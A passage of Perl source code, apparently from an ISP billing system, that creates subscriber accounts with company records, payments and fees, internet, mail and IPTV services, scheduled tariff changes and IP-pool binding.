    require Companies;
    Companies->import();
    my $Company = Companies->new($db, $admin, \%conf);

    my $companies_list = $Company->list({
      COMPANY_NAME  => $add_values{1}{COMPANY_NAME},
      PAGE_ROWS     => 1,
      COLS_NAME     => 1
    });

    if ($Company->{TOTAL} > 0) {
      $add_values{1}{COMPANY_ID} = $companies_list->[0]->{id};
      delete $add_values{5};
    }
    else {
      if ($add_values{1}{COMPANY_ADDRESS_BUILD}) {
        require Control::Address_mng;
        $add_values{1}{LOCATION_ID} = address_create({
          DISTRICT => $add_values{1}{COMPANY_CITY},
          STREET   => $add_values{1}{COMPANY_ADDRESS_STREET},
          BUILD    => $add_values{1}{COMPANY_ADDRESS_BUILD},
          ZIP      => $add_values{1}{COMPANY_ZIP},
          CITY     => $add_values{1}{COMPANY_CITY},
        });
      }

      $Company->add({
        NAME          => $add_values{1}{COMPANY_NAME},
        ADDRESS_FLAT  => $add_values{1}{COMPANY_ADDRESS_FLAT},
        LOCATION_ID   => $add_values{1}{LOCATION_ID},
        COMMENTS      => $add_values{1}{COMPANY_COMMENTS},
        CREATE_BILL   => 1
      });

      if (! $Company->{errno}) {
        $add_values{1}{COMPANY_ID} = $Company->{COMPANY_ID};
      }
    }
  }

  my Users $user = $users->add({
    %{$add_values{1}},
    CREATE_EXT_BILL => ((defined($attr->{'5.EXT_BILL_DEPOSIT'}) || $attr->{'1.CREATE_EXT_BILL'}) ? 1 : 0)
  });

  my $message = '';
  my $error_id = $user->{errno};

  if ($error_id && $conf{CARDS_MULTISERVICE} && ! $add_values{1}{COMPANY_NAME}) {
    delete $user->{errno};
    my %params = (LOGIN => $add_values{1}{LOGIN});

    if ($add_values{1}{UID}) {
      %params = ( UID => $add_values{1}{UID} );
      $uid = $add_values{1}{UID};
    }
    else {
      my $user_list = $user->list({ %params, COLS_NAME => 1 });
      $uid = $user_list->[0]->{uid};
      delete $add_values{5};
    }

    if ($uid) {
      $error_id=0;
    }
    else {
      return 0;
    }
  }
  else {
    $uid = $user->{UID};
  }

  if (!$error_id) {
    $user = $user->info($uid);

    #2
    if (defined($attr->{'2.newpassword'}) && $attr->{'2.newpassword'} ne '' && !$add_values{2}) {
      if (length($attr->{'2.newpassword'}) < $conf{PASSWD_LENGTH}) {
        $html->message('err', "$lang{PASSWD} : $lang{ERROR}", $lang{ERR_SHORT_PASSWORD}, { ID => 920 });
      }
      elsif ($attr->{'2.newpassword'} eq $attr->{'2.confirm'}) {
        $add_values{2}{PASSWORD} = $attr->{'2.newpassword'};
        $add_values{2}{UID} = $uid;
        $add_values{2}{DISABLE} = $attr->{'1.DISABLE'};
      }
      elsif ($attr->{'2.newpassword'} ne $attr->{'2.confirm'}) {
        $html->message('err', "$lang{PASSWD} : $lang{ERROR}", $lang{ERR_WRONG_CONFIRM}, { ID => 921 });
      }

      $user->change($uid, { %{$add_values{2}} });

      if ($conf{external_useradd}) {
        if (!_external($conf{external_useradd}, { LOGIN => $login, %{$add_values{2}} })) {
          return 0;
        }
      }
    }

    if ($add_values{3} && $add_values{3}{ADDRESS_FULL} && ! $add_values{3}{ADDRESS_STREET}) {
      $add_values{3}{ADDRESS_STREET} = $add_values{3}{ADDRESS_FULL};
    }

    if ($add_values{3}{ADDRESS_BUILD}) {
      require Control::Address_mng;
      $add_values{3}{LOCATION_ID} = address_create({
        DISTRICT => $add_values{3}{CITY},
        STREET   => $add_values{3}{ADDRESS_STREET},
        BUILD    => $add_values{3}{ADDRESS_BUILD},
        ZIP      => $add_values{3}{ZIP},
        CITY     => $add_values{3}{CITY},
      });
    }

    if ($add_values{3} && $add_values{3}{COMMENTS}) {
      $add_values{3}{COMMENTS} =~ s/\\n/\n/g;
    }

    #3 personal info
    $user->pi_add({
      %{(defined($add_values{3})) ? $add_values{3} : {}},
      UID => $uid
    });

    _error_show($user, { MESSAGE => "LOGIN: " . ($add_values{1}{LOGIN} || q{}), ID => 922 });

    #5 Payments section
    if($add_values{5}) {
      $add_values{5}{UID}  = $uid;
      $add_values{5}{USER} = $user;
      internet_wizard_fin($add_values{5});
    }

    # Ext bill add
    if ($FORM{'5.EXT_BILL_DEPOSIT'}) {
      $add_values{5}{SUM} = $FORM{'5.EXT_BILL_DEPOSIT'};
      # if Bonus $conf{BONUS_EXT_FUNCTIONS}
      if (in_array('Bonus', \@MODULES) && $conf{BONUS_EXT_FUNCTIONS}) {
        load_module('Bonus', $html);
        my $sum = $FORM{'5.EXT_BILL_DEPOSIT'};
        %FORM = %{$add_values{8}};
        $FORM{UID} = $uid;
        $FORM{SUM} = $sum;
        $FORM{add} = $uid;
        if ($FORM{SUM} < 0) {
          $FORM{ACTION_TYPE} = 1;
          $FORM{SUM} = abs($FORM{SUM});
        }

        $FORM{SHORT_REPORT} = 1;
        bonus_user_log({ USER_INFO => $user });
      }
      else {
        if ($FORM{'5.EXT_BILL_DEPOSIT'} + 0 > 0) {
          my $er = ($FORM{'5.ER'}) ? $Finance->exchange_info($FORM{'5.ER'}) : { ER_RATE => 1 };
          $Payments->add(
            $user,
            {
              %{$add_values{5}},
              BILL_ID => $user->{EXT_BILL_ID},
              ER      => $er->{ER_RATE}
            }
          );

          if (_error_show($Payments, { MODULE_NAME => $lang{PAYMENTS} })) {
            return 0;
          }
          else {
            $message = "$lang{SUM}: $add_values{5}{SUM} "
              . (($er->{ER_SHORT_NAME}) ? $er->{ER_SHORT_NAME} : q{}) . "\n";
          }
        }
        elsif ($FORM{'5.EXT_BILL_DEPOSIT'} + 0 < 0) {
          my $er = ($FORM{'5.ER'}) ? $Finance->exchange_info($FORM{'5.ER'}) : { ER_RATE => 1 };
          $Fees->take(
            $user,
            abs($FORM{'5.EXT_BILL_DEPOSIT'}),
            {
              BILL_ID  => $user->{EXT_BILL_ID},
              DESCRIBE => 'MIGRATION',
              ER       => $er->{ER_RATE}
            }
          );

          if (_error_show($Fees, { MODULE_NAME => $lang{FEES} })) {
            return 0;
          }
          else {
            $message = "$lang{SUM}: $FORM{'5.EXT_BILL_DEPOSIT'} $er->{ER_SHORT_NAME}\n";
          }
        }
      }
    }

    #4 Internet - Make Internet service only with TP
    if ($add_values{4}{TP_ID} || $add_values{4}{TP_NUM} || $add_values{4}{TP_NAME}) {
      $add_values{4}{UID}=$uid;
      internet_service_add($add_values{4});

      #Shedule
      if (scalar keys %{$add_values{13}} > 0) {
        my ($y, $m, $d)=split(/-/, $add_values{13}{DATE});
        my $tp_id = _check_tp({ %{$add_values{13}}, MODULE => 'Internet' });
        $Shedule->add({
          UID    => $uid,
          TYPE   => 'tp',
          ACTION => "$FORM{SERVICE_ID}:$tp_id",
          D      => $d,
          M      => $m,
          Y      => $y,
          MODULE => 'Internet'
        });
      }
    }

    # Add E-Mail account
    my $Mail;
    if (in_array('Mail', \@MODULES) && $FORM{'6.USERNAME'}) {
      load_module('Mail', $html);

      $Mail = Mail->new($db, $admin, \%conf);

      $FORM{'6.newpassword'} = $FORM{'6.PASSWORD'} if ($FORM{'6.PASSWORD'});

      $Mail->mbox_add(
        {
          UID      => $uid,
          %{$add_values{6}},
          PASSWORD => $FORM{'6.newpassword'},
        }
      );
      $Mail->{PASSWORD} = $FORM{'6.newpassword'};

      if (!_error_show($Mail, { MESSAGE => 'E-mail' })) {
        if ($FORM{'6.SEND_MAIL'}) {
          $message = $html->tpl_show(_include('mail_test_msg', 'Mail'), $Mail, { OUTPUT2RETURN => 1 });
          sendmail("$conf{ADMIN_MAIL}", "$Mail->{USER_EMAIL}", "Test mail", "$message", "$conf{MAIL_CHARSET}", "");
        }
      }

      $Mail = $Mail->mbox_info({ MBOX_ID => $Mail->{MBOX_ID} });
      $Mail->{EMAIL_ADDR} = $Mail->{USERNAME} . '@' . $Mail->{DOMAIN};
    }

    # Msgs
    if (in_array('Msgs', \@MODULES) && $add_values{7} && $FORM{'7.SUBJECT'}) {
      load_module('Msgs', $html);

      $FORM{INNER_MSG} = 1;
      Msgs->new($db, $admin, \%conf);

      %FORM = %{$add_values{7}};
      $FORM{UID} = $uid;
      $FORM{add} = $uid;
      msgs_admin_add({ SEND_ONLY => 1 });
    }

    # Abon
    if (in_array('Abon', \@MODULES) && $add_values{9}) {
      load_module('Abon', $html);
      %FORM = %{$add_values{9}};
      $FORM{UID} = $uid;
      $FORM{change} = $uid;
      abon_user({
        QUITE    => 1,
        TP_NAMES => $FORM{TP_NAMES},
        CHECK_TP => $FORM{TP_NAMES},
        SKIP_FEE => 1
      });
    }

    #Fees wizard form
    if (scalar keys %{$add_values{10}} > 0) {
      %FORM = %{$add_values{10}};
      $FORM{UID} = $uid;
      $FORM{add} = $uid;

      if (defined(&form_fees_wizard)) {
        form_fees_wizard({ USER_INFO => $user });
      }
    }

    #Iptv
    if (scalar keys %{$add_values{11}} > 0) {
      load_module('Iptv', $html);
      %FORM = %{$add_values{11}};
      $FORM{UID} = $uid;
      $FORM{add} = $uid;

      if (defined(&iptv_user_add)) {
        $FORM{TP_ID} = _check_tp({ %{ $add_values{11} }, MODULE => 'Iptv' });
        iptv_user_add(\%FORM);

        if($FORM{SCREEN_IDS}) {
          my @screens = split(/,\s?/, $FORM{SCREEN_IDS});
          my @screen_cids = ();
          if ($FORM{SCREEN_CIDS}) {
            @screen_cids = split(/,\s?/, $FORM{SCREEN_CIDS});
          }

          my $i=0;
          foreach my $screen ( @screens ) {
            iptv_users_screen_add({
              %FORM,
              SERVICE_ID => $FORM{SERVICE_ID},
              SCREEN_ID  => $screen,
              CID        => $screen_cids[$i] || undef
            });
            $i++;
          }
        }
      }

      if ($FORM{CHANGE_TP_DATE}) {
        $FORM{TP_ID} = _check_tp({
          TP_NAME => $FORM{CHANGE_TP_NAME},
          MODULE  => 'Iptv'
        });

        if ($FORM{TP_ID}) {
          #Shedule
          my ($Y, $M, $D) = split(/-/, $FORM{CHANGE_TP_DATE}, 3);

          $Shedule->add(
            {
              UID    => $uid,
              TYPE   => 'tp',
              ACTION => "$FORM{SERVICE_ID}:$FORM{TP_ID}",
              D      => $D,
              M      => $M,
              Y      => $Y,
              MODULE => 'Iptv'
            }
          );
        }
        else {
          $html->message('err', $lang{ERROR}, "NO TP_ID FOR SHDEULE\nLOGIN: $login UID: $FORM{UID} DATE: $FORM{CHANGE_TP_DATE} TP_NAME: ". ( $FORM{CHANGE_TP_NAME} || q{}));
        }
      }
    }

    #Tags
    if (scalar keys %{$add_values{12}} > 0) {
      load_module('Tags', $html);
      %FORM = %{$add_values{12}};
      $FORM{UID} = $uid;
      $FORM{add} = $uid;

      if (defined(&tags_user_add)) {
        tags_user_add(\%FORM);
      }
    }

    # Info
    my $internet = $Internet->user_info($uid);
    my $pi = $user->pi({ UID => $uid });
    $user = $user->info($uid, { SHOW_PASSWORD => 1 });

    if (!$attr->{SHORT_REPORT}) {
      $FORM{ex_message} = $message;
      if (in_array('Docs', \@MODULES)) {
        $message .= $lang{CONTRACT} . ': ' . $pi->{CONTRACT_SUFIX} . $pi->{CONTRACT_ID} . $html->button($lang{PRINT} . ' ' . $lang{CONTRACT}, "qindex=$index&UID=$uid&PRINT_CONTRACT=$uid&print=1" . (($conf{DOCS_PDF_PRINT}) ? '&pdf=1' : ''), { ex_params => 'target=_new', class => 'print' });
      }

      $html->message('info', $lang{ADDED}, "LOGIN: $login\nUID: $uid\n$message");
      $html->tpl_show(templates('form_user_info'), { %$user, %$pi, DATE => $DATE, TIME => $TIME });
      $internet->{STATUS} = $service_status->{ $internet->{STATUS} } if ($internet->{STATUS});
      $html->tpl_show(_include('internet_user_info', 'Internet'), $internet);
      $html->tpl_show(_include('mail_user_info', 'Mail'), $Mail) if ($Mail);

      #If docs module enable make account
      if (in_array('Docs', \@MODULES) && $FORM{'4.NO_ACCOUNT'}) {
        $LIST_PARAMS{UID} = $uid;

        if ($internet->{MONTH_FEE} + $internet->{ACTIVATE} > 0) {
          load_module('Docs', $html);

          $FORM{DATE} = $DATE;
          $FORM{CUSTOMER} = $pi->{FIO} || '-';
          $FORM{PHONE} = $pi->{PHONE};
          $FORM{UID} = $uid;

          $FORM{'IDS'} = '1, 2';
          $FORM{'ORDER_1'} = $lang{INTERNET};
          $FORM{'COUNT_1'} = 1;
          $FORM{'UNIT_1'} = 0;
          $FORM{'SUM_1'} = $internet->{MONTH_FEE};

          if ($Tariffs->{ACTIV_PRICE}) {
            $FORM{'ORDER_2'} = $lang{ACTIVATE};
            $FORM{'COUNT_2'} = 1;
            $FORM{'UNIT_2'} = 0;
            $FORM{'SUM_2'} = $internet->{MONTH_FEE};
          }

          $FORM{'create'} = 1;
          docs_invoice();
        }
      }
    }

    return $uid;
  }
  else {
    if ($users->{errno} == 7) {
      if (!$attr->{SHOW_USER}) {
        $html->message('err', "$lang{ERROR}", "$login: '" . $html->button($login, "index=7&LOGIN=$login&search=1&type=11") . "' $lang{USER_EXIST}");
      }
      my $list = $users->list({ LOGIN => $login, COLS_NAME => 1 });
      if ($users->{TOTAL} > 0) {
        $uid = $list->[0]->{uid} || 0;
      }
    }
    elsif ($users->{errno} == 10) {
      $html->message('err', $lang{ERROR}, "'$login' $lang{ERR_WRONG_NAME} ($conf{USERNAMEREGEXP})", { ID => 951 });
    }
    else {
      _error_show($users, { MESSAGE => "$lang{LOGIN}: '$login'" });
    }
  }

  return $uid;
}

#*******************************************************************
=head2 internet_wizard_fin($params)

  Arguments:
    $params

  Resturn:

=cut
#*******************************************************************
sub internet_wizard_fin {
  my ($params) = @_;

  my $Fees = Finance->fees($db, $admin, \%conf);
  my $Finance = Finance->new($db, $admin, \%conf);
  my $message = q{};

  my $user;
  if($params->{USER}) {
    $user = $params->{USER};
  }

  if ($params->{SUM} && $params->{SUM} =~ /^[0-9\-\.\,]+$/) {
    $params->{SUM} =~ s/,/\./g;
    if ($params->{SUM} > 0) {
      my $er = ($params->{ER}) ? $Finance->exchange_info($params->{ER}) : { ER_RATE => 1 };
      $Payments->add($user, { %{$params}, ER => $er->{ER_RATE} });
      $users->{DEPOSIT}=$params->{SUM};
      if ($Payments->{errno}) {
        _error_show($Payments, { MODULE_NAME => $lang{PAYMENTS} });
        return 0;
      }
      else {
        $message = "$lang{PAYMENTS} $lang{SUM}: " . ($params->{SUM} || 0) . ' ' . ($er->{ER_SHORT_NAME} || '') . "\n";
      }
    }
    elsif ($params->{SUM} < 0) {
      my $er = ($params->{ER}) ? $Finance->exchange_info($params->{ER}) : { ER_RATE => 1 };
      $Fees->take($user, abs($params->{SUM}), { DESCRIBE => 'MIGRATION', ER => $er->{ER_RATE} });

      if ($Fees->{errno}) {
        _error_show($Fees, { MODULE_NAME => $lang{FEES} });
        return 0;
      }
      else {
        $message = "$lang{FEES} $lang{SUM}: $params->{SUM} " . ($er->{ER_SHORT_NAME} || q{}) . "\n";
      }
    }
  }

  return 1;
}

#*******************************************************************
=head2 _check_tp($params)

  Arguments:
    $params

  Resturn:

=cut
#*******************************************************************
sub internet_service_add {
  my ($params) = @_;

  #Get NAS ID by IP
  if ($params->{NAS_IP} || $params->{NAS_NAME}) {
    delete $Nas->{NAS_ID};
    my $nas_list = $Nas->list({
      NAS_IP   => $params->{NAS_IP},
      #NAS_NAME => ($params->{NAS_IP}) ? undef : $params->{NAS_NAME},
      COLS_NAME=> 1
    });

    if ($Nas->{TOTAL} < 1) {
      $Nas->add({
        IP              => $params->{NAS_IP},
        NAS_NAME        => $params->{NAS_NAME},
        NAS_DESCRIBE    => $params->{NAS_DESCRIBE},
        MAC             => $params->{NAS_MAC},
        NAS_IDENTIFIER  => $params->{NAS_IDENTIFIER},
        NAS_MNG_PASSWORD=> $params->{NAS_MNG_PASSWORD}
      });

      if ($Nas->{errno}) {
        print "$Nas->{errno} // $Nas->{errstr}";
      }
      $params->{NAS_ID} = $Nas->{NAS_ID};
    }
    else {
      $params->{NAS_ID} = $nas_list->[0]->{nas_id};
    }
  }

  $params->{TP_ID} = _check_tp({ %{$params}, MODULE => 'Internet' });
  my $service_id = internet_user_add({
    %{$params},
    SKIP_MONTH_FEE             => $FORM{SERIAL},
    QUITE                      => 1,
    DO_NOT_USE_GLOBAL_USER_PLS => 1,
    #REGISTRATION               => 1
  });

  if (!$service_id) {
    return 0;
  }

  %FORM = %{$params};
  $FORM{SERVICE_ID} = $service_id;

  if ($FORM{CHANGE_TP_DATE}) {
    $FORM{TP_ID} = _check_tp({
      TP_NAME => $FORM{CHANGE_TP_NAME},
      MODULE  => 'Internet'
    });

    my ($Y, $M, $D) = split(/-/, $FORM{CHANGE_TP_DATE}, 3);
    if ($FORM{TP_ID}) {
      $Shedule->add(
        {
          UID    => $params->{UID},
          TYPE   => 'tp',
          ACTION => "$FORM{SERVICE_ID}:$FORM{TP_ID}",
          D      => $D,
          M      => $M,
          Y      => $Y,
          MODULE => 'Internet'
        });
    }
    else {
      print "UID: $params->{UID} / $FORM{CHANGE_TP_DATE} / " . ($FORM{CHANGE_TP_NAME} || q{}) . "//\n";
    }
  }

  return 0;
}

#*******************************************************************
=head2 _check_tp($attr)

  Arguments:
    $attr
      QUITE

  Resturn;
    tp_id

=cut
#*******************************************************************
sub _check_tp {
  my ($attr) = @_;

  my $module = $attr->{MODULE} || 'Internet';

  if($attr->{TP_ID}) {
    return $attr->{TP_ID};
  }

  if ($attr->{TP_NUM} || $attr->{TP_NAME}) {
    my $tp_list = $Tariffs->list({
      TP_ID     => $attr->{TP_NUM},
      NAME      => $attr->{TP_NAME},
      MODULE    => $module,
      COLS_NAME => 1
    });

    if ($Tariffs->{TOTAL} == 0) {
      my $tp_name = (! $attr->{TP_NAME}) ? "$lang{TARIF_PLAN}: $attr->{TP_NUM}" : $attr->{TP_NAME};
      $Tariffs->add({
        ID                => $attr->{TP_NUM},
        NAME              => $tp_name,
        MONTH_FEE         => $attr->{MONTH_FEE},
        DAY_FEE           => $attr->{DAY_FEE},
        USER_CREDIT_LIMIT => $attr->{USER_CREDIT_LIMIT},
        MODULE            => $module
      });

      _error_show($Tariffs, { ID => 981, MESSAGE => => $tp_name  });

      $attr->{TP_ID} = $Tariffs->{TP_ID} || q{};
      $html->message('info', $lang{ADD}, $lang{TARIF_PLAN}
        . ": ". ($attr->{TP_NUM} || $attr->{TP_NAME}). " ($attr->{TP_ID})") if (! $attr->{QUITE});
    }
    else {
      $attr->{TP_ID} = $tp_list->[0]->{tp_id};
    }
  }

  return $attr->{TP_ID};
}

#**********************************************************
=head2 internet_users_pools($attr) - Binding ip_pool to user

  Arguments:
    
  Returns:
    true
=cut
#**********************************************************
sub internet_users_pools {

  if (!$FORM{ID}) {
    $html->message('err', $lang{ERROR}, $lang{ADD_SERVICE});
    return 1;
  }

  if ($FORM{ID}) {
    print user_service_menu({
      SERVICE_FUNC_INDEX => get_function_index('internet_user'),
      PAGES_QS           => "&ID=$FORM{ID}",
      UID                => $FORM{UID},
      MK_MAIN            => 1
    });
  }

  my $get_ip_pool = $Nas->ip_pools_list({
    DOMAIN_ID => ($admin->{DOMAIN_ID}) ? $admin->{DOMAIN_ID} : undef,
    STATIC => 0,
    COLS_NAME => 1
  });

  my %template_args = ();
  $template_args{ACTION} = 'add';
  $template_args{LNG_ACTION} = $lang{SAVE};
  $template_args{DEL} = 'del';
  $template_args{LNG_DEL} = $lang{RESET};
  $template_args{DEL_BUTTON} = $html->button($lang{DEL}, "index=$index&del=1&ID=$FORM{ID}&UID=$FORM{UID}", {
    MESSAGE => "$lang{DEL}? ",
    class   => 'btn btn-danger'
  });

  if ($FORM{add}) {
    $Internet->add_user_ippool({
      SERVICE_ID => $FORM{ID},
      POOL_ID    => $FORM{POOL_ID},
      COMMENTS   => $FORM{COMMENTS}
    });

    $html->message('success', $lang{SUCCESS}, $lang{ADDED}) if !$Internet->{errno};
  }
  elsif ($FORM{del} && $FORM{COMMENTS}) {
    $Internet->del_user_ippool({ SERVICE_ID => $FORM{ID} });
    $html->message('success', $lang{SUCCESS}, $lang{DELETED}) if !$Internet->{errno};
  }

  my $info_users_pool = $Internet->info_user_ippool({ SERVICE_ID => $FORM{ID} });
  $template_args{COMMENTS} = $info_users_pool->{comments} || '';
  $template_args{POOL_ID} = $html->form_select('POOL_ID', {
    SELECTED    => $info_users_pool->{pool_id} || '',
    SEL_LIST    => $get_ip_pool,
    NO_ID       => 1,
    SEL_OPTIONS => { '' => '' },
  });

  $html->tpl_show(_include('internet_users_pool', 'Internet'), { %template_args, ID => $FORM{ID}, UID => $FORM{UID} });

  return 1;
}

#**********************************************************
=head2 internet_ip_pool_check($attr)

=cut
#**********************************************************
sub internet_ip_pool_check {
  my ($attr) = @_;

  my $pool_id = $attr->{POOL_ID} || $FORM{POOL_ID};
  return -1 if !$pool_id;

  my $static_ip_pools = $Nas->ip_pools_info($pool_id, { INTERNET_IP_FREE => 1 });

  return -1 if $static_ip_pools->{TOTAL} < 1 || !defined $static_ip_pools->{INTERNET_IP_FREE};

  if ($FORM{PRINT_JSON}) {
    my $status_color = !$static_ip_pools->{INTERNET_IP_FREE} ? 'danger' : $static_ip_pools->{INTERNET_IP_FREE} < 4 ?
      'warning' : '';
    print json_former({ status => $status_color, free => $static_ip_pools->{INTERNET_IP_FREE} });
  }

  return $static_ip_pools->{INTERNET_IP_FREE};
}

1;
